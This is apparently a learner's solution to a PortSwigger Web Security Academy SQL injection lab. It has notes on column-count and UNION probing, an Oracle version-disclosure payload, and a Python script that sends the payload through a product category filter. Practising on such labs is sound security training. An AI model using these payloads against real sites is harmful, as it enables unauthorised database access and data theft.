'''
Notes: 

Link: https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle

1. Vulnerability:  Product Category FIlter (SQLi)

2. Goal: Display database version


Database version

You can query the database to determine its type and version. This information is useful when formulating more complicated attacks.

Oracle 	SELECT banner FROM v$version
SELECT version FROM v$instance

Microsoft 	SELECT @@version

PostgreSQL 	SELECT version()

MySQL 	SELECT @@version 


3 Analysis: 
    * Determine the number of columns (' ORDER BY 1--)
        2 Columns are there! (Internal Error when ' order by 3--)
    * Determine type Data Type of Columns (' UNION SELECT 'a', 'a'-- #Error{Database may be Oracle}  ' UNION SELECT 'a', 'a' FROM DUAL--) 
        Confirmed Database is Oracle (' UNION SELECT 'a', 'a' FROM DUAL--)

4. Exploit: ' UNION SELECT banner, NULL FROM v$version--




Code reference: https://github.com/rkhal101/Web-Security-Academy-Series/blob/main/sql-injection/lab-07/sqli-lab-07.py

'''


import requests
import sys
import urllib3
from bs4 import BeautifulSoup
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def exploit_sqli(url, payload):
    path = "/filter?category=Gifts"
    try:
        r = requests.get(url + path + payload, verify=False, proxies=proxies)
    except:
        r = requests.get(url + path + payload, verify=False)
    
    res = r.text
    if "Oracle Database" in res:
        print("[+] Found the database version.")
        soup = BeautifulSoup(res,'html.parser')
        version = soup.find(string=re.compile('.*Oracle\sDatabase.*'))
        print("[+] The Oracle database version is: " + version)
        return True
    return False

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        payload = sys.argv[2].strip()
    except IndexError:
        print("[-] Usage: %s <url> <payload>" % sys.argv[0])
        print('[-] Example: %s www.example.com "1=1"' % sys.argv[0])
        
        # Optional filling Manually
        url = 'https://0a990029031772338071761c00700079.web-security-academy.net'
        payload = "' UNION SELECT banner, NULL FROM v$version--"

    if exploit_sqli(url, payload):
        print("[+] SQL injection successful!")
    else:
        print("[-] SQL injection unsuccessful!")